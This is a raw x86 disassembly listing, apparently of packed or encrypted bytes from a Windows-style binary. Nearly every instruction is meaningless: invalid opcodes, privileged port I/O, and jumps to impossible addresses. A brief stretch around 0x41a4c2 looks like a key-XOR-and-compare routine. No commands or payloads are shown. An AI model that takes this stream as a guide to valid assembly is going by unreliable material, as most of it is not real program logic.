  41a26b:	add    esp,DWORD PTR [ecx-0x7664a6a8]
  41a271:	inc    esi
  41a272:	gs push ebp
  41a274:	push   ebx
  41a275:	adc    al,dh
  41a277:	(bad)  
  41a278:	mov    ecx,ecx
  41a27a:	loop   0x41a2b7
  41a27c:	pop    eax
  41a27d:	test   BYTE PTR [ebp-0x32],dh
  41a280:	fdivr  QWORD PTR [ecx]
  41a282:	les    ebx,FWORD PTR [ecx]
  41a284:	fwait
  41a285:	push   ds
  41a286:	sbb    DWORD PTR [eax-0x3c],esi
  41a289:	shr    eax,cl
  41a28b:	retf   0x978b
  41a28e:	leave  
  41a28f:	add    al,0x65
  41a291:	shl    di,cl
  41a294:	jp     0x41a299
  41a296:	mov    ah,0x49
  41a298:	xor    eax,0xb3b6bd00
  41a29d:	pop    esi
  41a29e:	sbb    ch,bh
  41a2a0:	shl    cl,0xb2
  41a2a3:	outs   dx,BYTE PTR ds:[esi]
  41a2a4:	out    0x1c,al
  41a2a6:	mov    edi,0xb9d2f42c
  41a2ab:	and    ah,ah
  41a2ad:	pop    eax
  41a2ae:	test   DWORD PTR [ebx+0x8a2123a],0x8746409
  41a2b8:	mov    eax,0x707ec7a5
  41a2bd:	cld    
  41a2be:	test   al,0xc
  41a2c0:	retf   
  41a2c1:	cmp    ch,BYTE PTR [eax]
  41a2c3:	je     0x41a257
  41a2c5:	bound  esi,QWORD PTR [edi+0x4cc90a5d]
  41a2cb:	dec    edi
  41a2cc:	cmc    
  41a2cd:	mov    ecx,0x7fb781f8
  41a2d2:	gs ret 
  41a2d4:	call   DWORD PTR ds:0x5b67fafb
  41a2da:	jmp    0x41a2da
  41a2dc:	or     edi,DWORD PTR [edi+0x12700e34]
  41a2e2:	lahf   
  41a2e3:	mov    ebx,0x4f381490
  41a2e8:	dec    esi
  41a2e9:	lds    ecx,FWORD PTR [eax]
  41a2eb:	cs pop ecx
  41a2ed:	sar    DWORD PTR [ebx],0xc9
  41a2f0:	test   al,0xfb
  41a2f2:	xor    al,0x93
  41a2f4:	xor    BYTE PTR [eax],al
  41a2f6:	dec    ebp
  41a2f7:	add    ah,BYTE PTR [edx-0x24ee5ffa]
  41a2fd:	sub    dh,al
  41a2ff:	popf   
  41a300:	jbe    0x41a371
  41a302:	rcr    DWORD PTR [esi-0x2e1d976e],0xc0
  41a309:	add    DWORD PTR [edi+0x46929a58],ecx
  41a30f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a310:	sar    DWORD PTR gs:[ebx],1
  41a313:	mov    esp,edx
  41a315:	hlt    
  41a316:	icebp  
  41a317:	push   eax
  41a318:	sbb    DWORD PTR [edx+eiz*2],ebx
  41a31b:	out    0x3b,eax
  41a31d:	out    0x5c,al
  41a31f:	cmp    al,0xe3
  41a321:	push   0x2d1f4631
  41a326:	jmp    0x4a436494
  41a32b:	sbb    BYTE PTR [ebx],ah
  41a32d:	add    al,0xa8
  41a32f:	mov    esp,0xe4a829d1
  41a334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a335:	test   DWORD PTR [eax-0x7fa6b3b1],edi
  41a33b:	cmc    
  41a33c:	(bad)  
  41a33d:	setae  ah
  41a340:	mov    ss,WORD PTR [esi+0x73]
  41a343:	jno    0x41a38a
  41a345:	inc    esp
  41a346:	jne    0x41a3b4
  41a348:	pop    ds
  41a349:	push   0x5c12ce87
  41a34e:	sbb    eax,0xaa74895
  41a353:	cmp    esi,edi
  41a355:	ret    
  41a356:	xchg   ch,bl
  41a358:	in     eax,0x9e
  41a35a:	lahf   
  41a35b:	dec    edx
  41a35c:	xor    ebx,ebx
  41a35e:	pop    esp
  41a35f:	or     eax,0x6c087d1c
  41a364:	mov    DWORD PTR [ebp+0x70],eax
  41a367:	dec    ebx
  41a368:	or     eax,DWORD PTR [ecx+ecx*8]
  41a36b:	cs into 
  41a36d:	inc    ecx
  41a36e:	es ja  0x41a317
  41a371:	imul   esi,DWORD PTR [ecx+eiz*8+0x217d1fbf],0x6af062a2
  41a37c:	inc    edx
  41a37d:	mov    edx,DWORD PTR [ebx]
  41a37f:	and    BYTE PTR [eax+0x2d39c71c],al
  41a385:	dec    edx
  41a386:	mov    ebp,0xfc6e81cc
  41a38b:	arpl   WORD PTR [edi],cx
  41a38d:	stos   BYTE PTR es:[edi],al
  41a38e:	adc    al,0xcc
  41a390:	jmp    0x48c:0x2ff05bf8
  41a397:	adc    dl,BYTE PTR [edi]
  41a399:	pop    eax
  41a39a:	jmp    0x41a401
  41a39c:	call   0xe846:0x55620a68
  41a3a3:	xchg   BYTE PTR [edi-0x6257622b],cl
  41a3a9:	sub    bh,ch
  41a3ab:	in     eax,dx
  41a3ac:	loopne 0x41a3df
  41a3ae:	jns    0x41a427
  41a3b0:	jnp    0x41a41c
  41a3b2:	call   0x5b40:0x40bb6058
  41a3b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3ba:	addr16 pusha 
  41a3bc:	mov    al,ds:0xcbc23a32
  41a3c1:	inc    bl
  41a3c3:	repz dec ebx
  41a3c5:	pop    esi
  41a3c6:	fcos   
  41a3c8:	sub    BYTE PTR [ebx],cl
  41a3ca:	popf   
  41a3cb:	jmp    0x3eeebb08
  41a3d0:	fld    QWORD PTR [ecx+eax*4]
  41a3d3:	outs   dx,DWORD PTR ds:[esi]
  41a3d4:	push   edx
  41a3d5:	test   BYTE PTR [esp+ebp*2],bl
  41a3d8:	ror    DWORD PTR [ebx+ecx*2+0x44],0x87
  41a3dd:	(bad)
  41a3e2:	fistp  QWORD PTR [edi+0x18f58fdd]
  41a3e8:	xchg   edx,eax
  41a3e9:	stc    
  41a3ea:	or     DWORD PTR [ebp-0x5],edx
  41a3ed:	into   
  41a3ee:	xor    ah,ah
  41a3f0:	mov    eax,0xcf469178
  41a3f5:	sub    ch,dh
  41a3f7:	sti    
  41a3f8:	fst    DWORD PTR [esi-0x4b5400c1]
  41a3fe:	inc    esi
  41a3ff:	jmp    0x41a3d5
  41a401:	mov    WORD PTR [esi+0x36],ss
  41a404:	or     eax,0x59f61649
  41a409:	and    eax,0xcbf9d350
  41a40e:	lahf   
  41a40f:	xchg   ecx,eax
  41a410:	add    DWORD PTR [ecx-0x15],0xab4a6d8b
  41a417:	mov    ch,0xda
  41a419:	adc    ebx,DWORD PTR [ebp-0x34]
  41a41c:	fild   WORD PTR [ebp+0x26]
  41a41f:	xchg   ecx,eax
  41a420:	popf   
  41a421:	ds pop es
  41a423:	push   ds
  41a424:	mov    ch,0x2e
  41a426:	in     eax,dx
  41a427:	retf   
  41a428:	(bad)
  41a42d:	popa   
  41a42e:	jl     0x41a40f
  41a430:	shl    DWORD PTR [edi-0x2f],1
  41a433:	das    
  41a434:	jb     0x41a439
  41a436:	jle    0x41a3ca
  41a438:	in     al,dx
  41a439:	xchg   ebx,eax
  41a43a:	sti    
  41a43b:	in     eax,0xc8
  41a43d:	in     eax,0xd9
  41a43f:	mov    esp,0x5281fefc
  41a444:	xchg   ebx,eax
  41a445:	xchg   edi,eax
  41a446:	cli    
  41a447:	outs   dx,BYTE PTR ds:[esi]
  41a448:	sbb    al,0x72
  41a44a:	and    DWORD PTR ds:0xad692056,esi
  41a450:	pusha  
  41a451:	push   edi
  41a452:	fsub   QWORD PTR [ebp+0x15258ed0]
  41a458:	ficomp WORD PTR [edx]
  41a45a:	inc    edi
  41a45b:	je     0x41a457
  41a45d:	rol    BYTE PTR [ecx+0x50],0xe5
  41a461:	or     eax,0x21640c12
  41a466:	fstp   QWORD PTR [esi+0x2d]
  41a469:	in     al,dx
  41a46a:	out    0xfe,eax
  41a46c:	sub    DWORD PTR [esi+ebp*8-0x736aa709],eax
  41a473:	mov    ah,0x55
  41a475:	data16 shl al,1
  41a478:	je     0x41a446
  41a47a:	rcr    BYTE PTR [edi],0x49
  41a47d:	inc    edi
  41a47e:	sbb    al,0x7a
  41a481:	sub    ah,al
  41a483:	jmp    FWORD PTR [eax]
  41a485:	das    
  41a486:	adc    DWORD PTR [ebx+esi*2],edi
  41a489:	outs   dx,BYTE PTR ds:[esi]
  41a48a:	xor    ecx,edi
  41a48c:	mov    dh,bh
  41a48e:	sub    DWORD PTR [edi+0x28cd230e],esp
  41a494:	sbb    esp,DWORD PTR [ebx+0x7d]
  41a497:	and    eax,0x6b38704f
  41a49c:	and    edx,DWORD PTR [edi-0xe059795]
  41a4a2:	xlat   BYTE PTR ds:[ebx]
  41a4a3:	xchg   esi,eax
  41a4a4:	ret    
  41a4a5:	jmp    0x4642c9f2
  41a4aa:	aam    0x2c
  41a4ac:	pop    ds
  41a4ad:	icebp  
  41a4ae:	int    0x4b
  41a4b0:	loope  0x41a49b
  41a4b2:	inc    ecx
  41a4b3:	mov    ah,0x33
  41a4b5:	repnz add eax,ecx
  41a4b8:	add    esi,ecx
  41a4ba:	imul   eax,esi
  41a4bd:	jmp    0x41c8af
  41a4c2:	mov    eax,DWORD PTR [ebp+0xc]
  41a4c5:	mov    eax,DWORD PTR [eax+0x78]
  41a4c8:	mov    DWORD PTR [ebp+0xc],eax
  41a4cb:	mov    eax,DWORD PTR [ebp-0x4]
  41a4ce:	mov    esi,DWORD PTR [ebp-0x8]
  41a4d1:	xor    eax,edx
  41a4d3:	xor    esi,edx
  41a4d5:	add    eax,ecx
  41a4d7:	add    esi,ecx
  41a4d9:	imul   eax,esi
  41a4dc:	mov    esi,DWORD PTR [ebp+0xc]
  41a4df:	cmp    esi,eax
  41a4e1:	mov    eax,DWORD PTR [ebp-0x4]
  41a4e4:	je     0x4180fd
  41a4ea:	xor    eax,edx
  41a4ec:	jmp    0x41c89e
  41a4f1:	aaa    
  41a4f2:	dec    eax
  41a4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f4:	sbb    DWORD PTR [edi-0x67],esp
  41a4f7:	xchg   DWORD PTR [eax],ebp
  41a4f9:	and    bl,BYTE PTR [ecx+eiz*8+0x689559ab]
  41a500:	ror    BYTE PTR [eax+0x0],1
  41a503:	popa   
  41a504:	(bad)  
  41a505:	int    0x5f
  41a507:	bound  esp,QWORD PTR [edx+0x4d]
  41a50a:	jecxz  0x41a56b
  41a50c:	scas   al,BYTE PTR es:[edi]
  41a50d:	adc    DWORD PTR ds:0x7295016d,ebp
  41a513:	(bad)  
  41a514:	fwait
  41a515:	sar    BYTE PTR [ebx-0xc0ef936],0x5
  41a51c:	push   esi
  41a51d:	fwait
  41a51e:	and    BYTE PTR fs:[edi+0x5ce0bee9],dh
  41a525:	cmp    bl,BYTE PTR [ebx-0x8cc369a]
  41a52b:	cmp    ch,BYTE PTR [ecx-0x3c3208bb]
  41a531:	gs mov ecx,0xef7f4daf
  41a537:	jle    0x41a586
  41a539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a53a:	nop
  41a53b:	mov    eax,ds:0xc1aa0f2b
  41a540:	mov    edx,DWORD PTR [edi]
  41a542:	cmp    DWORD PTR [ecx-0x759baf07],ecx
  41a548:	xchg   ebx,eax
  41a549:	pusha  
  41a54a:	imul   esp,DWORD PTR [eax],0xffffffde
  41a54d:	int3   
  41a54e:	push   cs
  41a54f:	ds push ecx
  41a551:	in     eax,0xa2
  41a553:	cwde   
  41a554:	sbb    BYTE PTR [esi-0x101d3450],dh
  41a55a:	jbe    0x41a59c
  41a55c:	fs inc eax
  41a55e:	mov    dh,0x1f
  41a560:	out    dx,eax
  41a561:	mov    esp,esi
  41a563:	jmp    0x41a5da
  41a565:	mov    BYTE PTR [ebx+0x2],al
  41a568:	xchg   edi,eax
  41a569:	xchg   edi,eax
  41a56a:	xchg   edi,eax
  41a56b:	xchg   ecx,eax
  41a56c:	inc    edx
  41a56d:	retf   0x6260
  41a570:	xor    eax,0x365c0c8f
  41a575:	inc    esi
  41a576:	ret    
  41a577:	outs   dx,BYTE PTR ds:[esi]
  41a578:	inc    eax
  41a579:	(bad)  [ebp-0x1]
  41a57c:	xlat   BYTE PTR ds:[ebx]
  41a57d:	cmp    DWORD PTR [edx-0x74c15961],ebp
  41a583:	xchg   edi,eax
  41a584:	adc    bh,BYTE PTR [eax+0x8]
  41a587:	lock jae 0x41a557
  41a58a:	and    BYTE PTR [ebx-0x75],dl
  41a58d:	mov    eax,ds:0xa316b051
  41a592:	mov    cl,0xa4
  41a594:	(bad)  
  41a595:	adc    eax,0xe5bb5d94
  41a59a:	pslld  mm6,QWORD PTR [edx]
  41a59d:	mov    WORD PTR [eax],?
  41a59f:	or     al,0x6d
  41a5a1:	js     0x41a5d1
  41a5a3:	mov    dh,BYTE PTR [ebp+0x1e33e206]
  41a5a9:	lea    esi,[esi+0x32ae0c6c]
  41a5af:	lea    esi,[edi+0x62]
  41a5b2:	lea    eax,[edi]
  41a5b4:	push   0xa6e3e621
  41a5b9:	adc    al,0x67
  41a5bb:	push   0x15
  41a5bd:	xor    bl,ah
  41a5bf:	out    0xd6,al
  41a5c1:	mov    ecx,DWORD PTR [esi-0x10f5d9f7]
  41a5c7:	mov    BYTE PTR [ebx],ch
  41a5c9:	cmp    DWORD PTR [esp+edi*4+0x7695ff06],eax
  41a5d0:	push   cs
  41a5d1:	cld    
  41a5d2:	xor    BYTE PTR [edi],ch
  41a5d4:	(bad)  
  41a5d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5d7:	int    0x7d
  41a5d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5da:	ret    0x36dd
  41a5dd:	inc    esp
  41a5de:	mov    ebp,0xa33a208c
  41a5e4:	and    BYTE PTR [edx+ebx*4+0x44],ch
  41a5e8:	bound  edx,QWORD PTR [di+0x7870]
  41a5ed:	test   DWORD PTR [edx+0x60239e52],ebx
  41a5f3:	inc    ebx
  41a5f4:	popa   
  41a5f5:	cmp    BYTE PTR [edx],dh
  41a5f7:	(bad)  
  41a5f8:	out    0xa0,al
  41a5fa:	mov    esi,0x421ec780
  41a5ff:	jmp    0x6480:0x3d4c302f
  41a606:	imul   edx,DWORD PTR [esi-0x7b],0x51c4d454
  41a60d:	pop    ds
  41a60e:	dec    ecx
  41a60f:	ins    DWORD PTR es:[edi],dx
  41a610:	(bad)  
  41a611:	fisubr WORD PTR [edi+0x793ffcef]
  41a617:	sub    ebp,DWORD PTR [edi-0x5c]
  41a61a:	mov    ?,WORD PTR [eax+edx*4-0x198eed29]
  41a621:	fs jmp 0x41a61b
  41a624:	jecxz  0x41a637
  41a626:	sbb    BYTE PTR [esi+0x5d8d5faa],bl
  41a62c:	xor    DWORD PTR [eax],ebx
  41a62e:	pushf  
  41a62f:	jo     0x41a5e9
  41a631:	imul   ebp,edx,0xa9a3d5f8
  41a637:	cmp    DWORD PTR [esi-0x4f],0x4c43d610
  41a63e:	addr16 pop ecx
  41a640:	pop    ds
  41a641:	daa    
  41a642:	mov    cl,0x48
  41a644:	or     BYTE PTR [ecx-0x69],cl
  41a647:	(bad)  
  41a648:	lds    eax,FWORD PTR [ecx+0x4a738427]
  41a64e:	and    al,bh
  41a650:	mov    dl,0x58
  41a652:	popa   
  41a653:	aad    0x11
  41a655:	sbb    BYTE PTR [ebx+0x61],dl
  41a658:	add    eax,0xde2e6759
  41a65d:	repz addr16 jne 0x41a65b
  41a661:	hlt    
  41a662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a663:	hlt    
  41a664:	jle    0x41a6da
  41a666:	sar    DWORD PTR [ebx],1
  41a668:	ja     0x41a6b0
  41a66a:	or     BYTE PTR [ebx],ch
  41a66c:	test   BYTE PTR [ecx+0x20b3ef47],al
  41a672:	add    ebx,esp
  41a674:	jl     0x41a6ad
  41a676:	cmp    dl,al
  41a678:	lea    ecx,[edx+0x5ed7e295]
  41a67e:	pop    ebp
  41a67f:	arpl   WORD PTR [edx],cx
  41a681:	cmp    edx,esi
  41a683:	inc    eax
  41a684:	rol    cl,0x23
  41a687:	cmp    BYTE PTR [eax-0x626784f2],bh
  41a68d:	nop
  41a68e:	(bad)  
  41a68f:	jmp    0x41a688
  41a691:	inc    esi
  41a692:	retf   0xc1a0
  41a695:	mov    dl,0xb1
  41a697:	pop    ebx
  41a698:	add    al,0xf2
  41a69a:	in     eax,0x25
  41a69c:	loope  0x41a6ef
  41a69e:	inc    esi
  41a69f:	imul   esi,DWORD PTR [ebx+0x4465ac42],0x5f32dd7e
  41a6a9:	je     0x41a687
  41a6ab:	sbb    al,0x3c
  41a6ad:	push   ebx
  41a6ae:	xor    al,0xd9
  41a6b0:	nop
  41a6b1:	or     cl,BYTE PTR [edi]
  41a6b3:	mov    ds:0xd8f8267d,eax
  41a6b8:	fsub   st,st(6)
  41a6ba:	loope  0x41a6bb
  41a6bc:	and    al,BYTE PTR [ecx-0x74]
  41a6bf:	fld    st(5)
  41a6c1:	scas   al,BYTE PTR es:[edi]
  41a6c2:	jle    0x41a652
  41a6c4:	adc    eax,0xfb905516
  41a6c9:	js     0x41a687
  41a6cb:	lods   al,BYTE PTR ds:[esi]
  41a6cc:	or     esp,DWORD PTR [ecx+0x34504141]
  41a6d2:	adc    al,0x67
  41a6d4:	mov    cs,WORD PTR [eax]
  41a6d6:	cmp    al,0x91
  41a6d9:	add    ebx,DWORD PTR [edx]
  41a6db:	aam    0x45
  41a6dd:	jmp    0xd587f304
  41a6e2:	and    eax,0xa223903b
  41a6e7:	xchg   esp,eax
  41a6e8:	nop
  41a6e9:	jno    0x41a68d
  41a6eb:	jo     0x41a676
  41a6ed:	jne    0x41a6d6
  41a6ef:	aas    
  41a6f0:	inc    ebp
  41a6f1:	rol    DWORD PTR [edi+ebx*8+0x5dc04353],0x30
  41a6f9:	(bad)  
  41a6fb:	mov    esp,0x8b7d779f
  41a700:	push   0xdab2035a
  41a705:	adc    ebx,DWORD PTR [esp+edx*4]
  41a708:	inc    edi
  41a709:	test   eax,0xa60404
  41a70e:	sbb    DWORD PTR [eax+0x23],edi
  41a711:	mov    BYTE PTR [esi-0x4d],ah
  41a714:	test   eax,0xe994cf95
  41a719:	imul   esp,DWORD PTR [edx],0x17ce5ac8
  41a71f:	sub    ecx,DWORD PTR [edi-0x68]
  41a722:	or     eax,ebp
  41a724:	mov    al,ds:0x72fff3c
  41a729:	mov    esp,0x729bbc0e
  41a72e:	fwait
  41a72f:	push   ebx
  41a730:	cmp    DWORD PTR [esi+0x3cb17a1f],esp
  41a736:	fcmovne st,st(5)
  41a738:	xor    DWORD PTR [ebx-0x5e814134],ebp
  41a73e:	int    0xf1
  41a740:	fmul   QWORD PTR [eax-0x18]
  41a743:	int    0x7e
  41a745:	jg     0x41a74b
  41a747:	lahf   
  41a748:	and    eax,0xc2fae244
  41a74d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a74e:	dec    ebx
  41a74f:	dec    esp
  41a750:	mov    dl,0xce
  41a752:	ins    DWORD PTR es:[edi],dx
  41a753:	xchg   BYTE PTR [ebp-0x14538d66],ah
  41a759:	rol    ah,1
  41a75b:	jnp    0x41a7b1
  41a75d:	xor    eax,0xd38e4339
  41a762:	mov    edi,edx
  41a764:	pop    edi
  41a765:	pushf  
  41a766:	loop   0x41a700
  41a768:	cdq    
  41a769:	mov    eax,DWORD PTR [ebp-0x2c0aec86]
  41a76f:	(bad)  
  41a770:	or     esp,DWORD PTR [edi]
  41a772:	outs   dx,BYTE PTR ds:[esi]
  41a773:	retf   0xbbab
  41a776:	sbb    bh,BYTE PTR [eax-0x2db05c67]
  41a77c:	mov    al,0x26
  41a77e:	leave  
  41a77f:	xor    bh,BYTE PTR [esi+0x2046d757]
  41a785:	jp     0x41a79e
  41a787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a788:	inc    edx
  41a789:	mov    ebx,0x29d422e4
  41a78e:	fcmovnb st,st(7)
  41a790:	sti    
  41a791:	out    dx,eax
  41a792:	aas    
  41a793:	div    DWORD PTR [ecx+ecx*4]
  41a796:	not    BYTE PTR [ebp-0x2]
  41a799:	rol    DWORD PTR [ecx+0x5858c6f],cl
  41a79f:	repz (bad) 
  41a7a1:	rcl    ecx,1
  41a7a3:	rcr    BYTE PTR [ebx+0x5753c91],cl
  41a7a9:	(bad)  
  41a7aa:	rol    DWORD PTR [ecx+0x2e],1
  41a7ad:	ficomp DWORD PTR [edx]
  41a7af:	xchg   BYTE PTR [edx],bh
  41a7b1:	add    ebx,DWORD PTR [edx]
  41a7b3:	mov    edx,0x3afd672f
  41a7b8:	pop    edi
  41a7b9:	stos   DWORD PTR es:[edi],eax
  41a7ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7bb:	cmc    
  41a7bc:	fs pop ecx
  41a7be:	xchg   ebp,eax
  41a7bf:	test   eax,0x4111e04c
  41a7c4:	adc    dl,al
  41a7c6:	mov    cl,0x33
  41a7c8:	lods   eax,DWORD PTR ds:[esi]
  41a7c9:	add    esp,DWORD PTR [eax+ecx*4]
  41a7cc:	imul   ebp,DWORD PTR [esi],0xffffffaa
  41a7cf:	ja     0x41a784
  41a7d1:	or     eax,0x72a67d53
  41a7d6:	ss scas eax,DWORD PTR es:[edi]
  41a7d8:	mov    edx,0x9c43f572
  41a7dd:	lea    edi,[esp+eax*4]
  41a7e0:	xchg   ebp,eax
  41a7e1:	ins    BYTE PTR es:[edi],dx
  41a7e2:	xchg   esp,eax
  41a7e3:	xchg   esi,eax
  41a7e4:	jge    0x41a7e7
  41a7e6:	xchg   ebx,eax
  41a7e7:	xchg   ah,ah
  41a7e9:	nop
  41a7ea:	add    al,0x78
  41a7ec:	fst    DWORD PTR [ecx+edi*1+0x72]
  41a7f0:	pusha  
  41a7f1:	aad    0xa6
  41a7f3:	or     ax,0xecc6
  41a7f7:	cld    
  41a7f8:	jns    0x41a847
  41a7fa:	popa   
  41a7fb:	div    BYTE PTR [esi]
  41a7fd:	scas   al,BYTE PTR es:[edi]
  41a7fe:	mov    eax,0x3805f7c9
  41a803:	adc    al,0xff
  41a805:	in     eax,dx
  41a806:	push   ebx
  41a807:	or     eax,edi
  41a809:	sub    BYTE PTR [edx],0xb5
  41a80c:	cli    
  41a80d:	jo     0x41a878
  41a80f:	or     ebp,DWORD PTR [eax+eax*2-0x8f1635d]
  41a816:	cld    
  41a817:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a818:	mov    esi,0x3113d550
  41a81d:	repz ja 0x41a7af
  41a820:	rol    DWORD PTR [edx-0xb2bfce4],1
  41a826:	cmp    esp,DWORD PTR [ecx+0x47]
  41a829:	in     eax,0x41
  41a82b:	mov    cl,0x99
  41a82d:	fld    DWORD PTR [edx+0x71]
  41a830:	add    BYTE PTR [edx],bh
  41a832:	lock sbb al,0xf5
  41a835:	mov    ecx,0x36d771ed
  41a83a:	jecxz  0x41a849
  41a83c:	push   esi
  41a83d:	mov    esp,0xd8437563
  41a842:	sub    eax,0x5e26033
  41a847:	lods   al,BYTE PTR ds:[esi]
  41a848:	jb     0x41a7e6
  41a84a:	xchg   edx,eax
  41a84b:	xchg   esi,eax
  41a84c:	mov    cs,WORD PTR [ebx+0x595adc4e]
  41a852:	rol    DWORD PTR [ecx+edi*8-0x28],cl
  41a856:	cmp    DWORD PTR [eax-0x1c],edx
  41a859:	add    ch,ah
  41a85b:	or     eax,DWORD PTR [eax+eiz*1]
  41a85e:	xor    esp,DWORD PTR [ebx-0x7cdfa321]
  41a864:	xchg   BYTE PTR [ebp-0x75763eb3],bl
  41a86a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a86b:	mov    DWORD PTR [ebp+0x3f],ebp
  41a86e:	push   ecx
  41a86f:	mov    edi,0x7b039e56
  41a874:	push   esi
  41a875:	enter  0x3a13,0x4
  41a879:	mov    esp,0xb9f37c71
  41a87e:	xchg   DWORD PTR [edi-0x25],edi
  41a881:	fidiv  WORD PTR [ebx-0x3f]
  41a884:	imul   ecx,edx,0x3f
  41a887:	gs inc edx
  41a889:	mov    al,0x6d
  41a88b:	cdq    
  41a88c:	mov    edx,0x2cc9a1ac
  41a891:	nop
  41a892:	clc    
  41a893:	das    
  41a894:	xor    DWORD PTR [ebx+0x6db5cf06],0xcad4fcf0
  41a89e:	icebp  
  41a89f:	inc    ebx
  41a8a0:	push   esp
  41a8a1:	rcr    BYTE PTR [ecx],0x9d
  41a8a4:	out    dx,eax
  41a8a5:	(bad)  
  41a8a7:	retf   0x22ca
  41a8aa:	mov    cl,0x32
  41a8ac:	and    ebp,DWORD PTR [ebp+0x42e977c]
  41a8b2:	(bad)  
  41a8b5:	and    esi,DWORD PTR [ebx]
  41a8b7:	inc    ecx
  41a8b8:	in     eax,dx
  41a8b9:	sub    eax,0x9ec2eb45
  41a8be:	cmp    ch,cl
  41a8c0:	cli    
  41a8c1:	sub    BYTE PTR [ebp+0x7cfe470d],ch
  41a8c7:	sbb    al,0x21
  41a8c9:	sbb    DWORD PTR [esi],ebp
  41a8cb:	dec    ecx
  41a8cc:	sbb    ah,BYTE PTR [esi]
  41a8ce:	out    dx,eax
  41a8cf:	mov    cl,0xaf
  41a8d1:	inc    edx
  41a8d2:	je     0x41a914
  41a8d4:	xor    DWORD PTR [edx-0x77],0xffffff97
  41a8d8:	mov    dl,0x9c
  41a8da:	inc    DWORD PTR [edi+0x4f]
  41a8dd:	faddp  st(3),st
  41a8df:	aad    0x13
  41a8e1:	(bad)  
  41a8e2:	mov    ebp,0xeda7304d
  41a8e7:	add    al,BYTE PTR [ebp+0x2]
  41a8ea:	add    DWORD PTR [esi+ebx*2-0x68],edx
  41a8ee:	cmp    eax,0x7e776fba
  41a8f3:	push   esp
  41a8f4:	push   ebx
  41a8f5:	addr16 pusha 
  41a8f7:	xor    DWORD PTR ds:0xe19349df,0xb31d19b0
  41a901:	pushf  
  41a902:	mov    ebx,0xa35684cc
  41a907:	or     ebp,DWORD PTR [ebp-0x2a]
  41a90a:	pushf  
  41a90b:	in     eax,0x18
  41a90d:	and    eax,0x8543d861
  41a912:	add    al,0x79
  41a914:	pop    edx
  41a915:	push   ebp
  41a916:	stos   BYTE PTR es:[edi],al
  41a917:	mov    ds:0x2de025bc,eax
  41a91c:	inc    edx
  41a91d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a91e:	push   ds
  41a91f:	out    dx,al
  41a920:	call   0x444ce9ea
  41a925:	or     eax,0xb90c0285
  41a92a:	stc    
  41a92b:	popf   
  41a92c:	jp     0x41a8da
  41a92e:	iret   
  41a92f:	cmp    eax,0x9b74d45d
  41a934:	dec    ecx
  41a935:	push   cs
  41a936:	aaa    
  41a937:	pop    esp
  41a938:	gs fcomip st,st(3)
  41a93b:	fiadd  WORD PTR [esi+edi*8-0x66]
  41a93f:	sub    eax,0xc9617edc
  41a944:	dec    esi
  41a945:	inc    ebx
  41a946:	dec    esp
  41a947:	adc    ebx,DWORD PTR [edx+eiz*1-0x39]
  41a94b:	mov    eax,0x8e9ed61d
  41a950:	mov    ch,0xf8
  41a952:	int3   
  41a953:	dec    ecx
  41a954:	popa   
  41a955:	not    BYTE PTR [eax-0x27]
  41a958:	mov    ch,0x7e
  41a95a:	in     al,dx
  41a95b:	cli    
  41a95c:	das    
  41a95d:	in     al,0x8
  41a95f:	bnd jb 0x41a985
  41a962:	add    eax,0xbcc9c3f1
  41a967:	sti    
  41a968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a969:	int3   
  41a96a:	ror    DWORD PTR [ebp-0x4079e316],0x15
  41a971:	xor    BYTE PTR [esi-0x44],bh
  41a974:	(bad)
  41a977:	imul   esi,edi,0xd24288e3
  41a97d:	cmp    eax,DWORD PTR [eax-0x555ab05e]
  41a983:	ins    BYTE PTR es:[edi],dx
  41a984:	mov    ah,0x8d
  41a986:	inc    ecx
  41a987:	and    ebx,DWORD PTR [ecx+ebx*8]
  41a98a:	adc    al,0xdd
  41a98c:	hlt    
  41a98d:	shld   DWORD PTR es:[ecx+ebx*2+0x45f1f162],ebx,0x91
  41a997:	sbb    al,0xe7
  41a999:	not    BYTE PTR [ecx+0x35]
  41a99c:	addr16 mov bl,0x55
  41a99f:	out    dx,eax
  41a9a0:	push   eax
  41a9a1:	sbb    DWORD PTR [ecx+edx*2-0x27],eax
  41a9a5:	test   WORD PTR cs:[ecx+ecx*1],0x68de
  41a9ac:	xor    BYTE PTR [ecx-0x22],0xab
  41a9b0:	inc    ecx
  41a9b1:	sub    edx,DWORD PTR fs:[ebp-0x80]
  41a9b5:	out    dx,al
  41a9b6:	sar    BYTE PTR [esi+0x5b],1
  41a9b9:	repz push esp
  41a9bb:	cld    
  41a9bc:	pop    ebx
  41a9bd:	cmp    BYTE PTR cs:[eax+ebp*4+0x3],bh
  41a9c2:	dec    esp
  41a9c3:	cld    
  41a9c4:	pop    ebp
  41a9c5:	imul   esi,DWORD PTR [ebp-0x7e],0xf7f2a914
  41a9cc:	sbb    BYTE PTR [edi],al
  41a9ce:	scas   al,BYTE PTR es:[edi]
  41a9cf:	cmp    BYTE PTR [edi-0x3ca6aa31],al
  41a9d5:	call   DWORD PTR [ecx]
  41a9d7:	push   ss
  41a9d8:	bound  edi,QWORD PTR [edx]
  41a9da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9db:	es xchg esp,eax
  41a9dd:	add    al,BYTE PTR [esi]
  41a9df:	ja     0x41aa06
  41a9e1:	inc    ebx
  41a9e2:	xchg   edi,eax
  41a9e3:	popf   
  41a9e4:	pop    ss
  41a9e5:	jmp    0x7993811c
  41a9ea:	test   eax,0x62aa7a5
  41a9ef:	dec    esp
  41a9f0:	pop    ecx
  41a9f2:	outs   dx,BYTE PTR ds:[si]
  41a9f4:	xlat   BYTE PTR ds:[ebx]
  41a9f5:	call   0xa2ffc5f4
  41a9fa:	loope  0x41aa2b
